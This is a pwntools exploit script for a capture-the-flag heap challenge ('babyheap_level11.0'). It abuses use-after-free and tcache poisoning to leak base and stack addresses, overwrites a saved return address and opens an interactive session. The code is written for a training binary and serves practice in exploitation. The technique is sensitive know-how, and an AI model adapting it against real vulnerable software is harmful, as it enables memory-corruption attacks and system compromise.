from pwn import *
binary = '/challenge/babyheap_level11.0'  # Replace with your binary name
r = process(binary)

leak = 0x7f476b0ef620 + 0x8 #pwndbg>leakfind
log.info(f"Run the binary multiple times to defeat PIE")
log.info(f"Address Contains Pointer to Stack pwndbg>leakfind {hex(leak)}")
for i in range(0,2):
        r.sendline(b"malloc")
        r.sendline(str(i).encode())
        r.sendline(b"32")
for b in range(0,2):
        r.sendline(b"free")
        r.sendline(str(b).encode())
r.sendline(b"scanf")
r.sendline(b"1")
r.sendline(p64(leak))
r.sendline(b"echo")
r.read()
r.sendline(b"1")
r.sendline(b"0")
r.read()
leak2 = r.read()[6:-1]
basse_addr = int.from_bytes(leak2,byteorder='little')
basse_addr = str(hex(basse_addr))[:-4]
basse_addr = basse_addr + "bb00"
base_addr_parse = int(basse_addr,16)
log.info(f"Basse Addr Functions {basse_addr}")
log.info(f"Basse Addr Functions {int(basse_addr,16)}")
r.sendline(b"free")
r.sendline(b"1")
r.sendline(b"echo")
r.read()
r.sendline(b"1")
r.sendline(b"8")
r.read()
stack_addr = int.from_bytes(r.read()[6:-1],byteorder='little')
stack_addr = stack_addr-2138
stack_addr = stack_addr+2168+32+304
ret = stack_addr + 8
log.info(f"Saved Rbp {hex(stack_addr)}")
log.info(f"Ret Address {hex(stack_addr + 8)}")
r.sendline(b"free")
r.sendline(b"1")
for i in range(2,4):
        r.sendline(b"malloc")
        r.sendline(str(i).encode())
        r.sendline(b"16")
for b in range(2,4):
        r.sendline(b"free")
        r.sendline(str(b).encode())
r.sendline(b"scanf")
r.sendline(b"3")
r.sendline(p64(stack_addr))
for i in range(2,5):
        r.sendline(b"malloc")
        r.sendline(str(i).encode())
        r.sendline(b"16")
r.sendline(b"free")
r.sendline(b"2")
r.sendline(b"free")
r.sendline(b"4")
r.sendline(b"scanf")
r.sendline(b"4")
r.sendline(p64(ret))
for i in range(0,2):
        r.sendline(b"malloc")
        r.sendline(str(i).encode())
        r.sendline(b"16")
r.sendline(b"scanf")
r.sendline(b"1")
r.sendline(p64(base_addr_parse))
r.sendline(b"quit")
r.interactive()
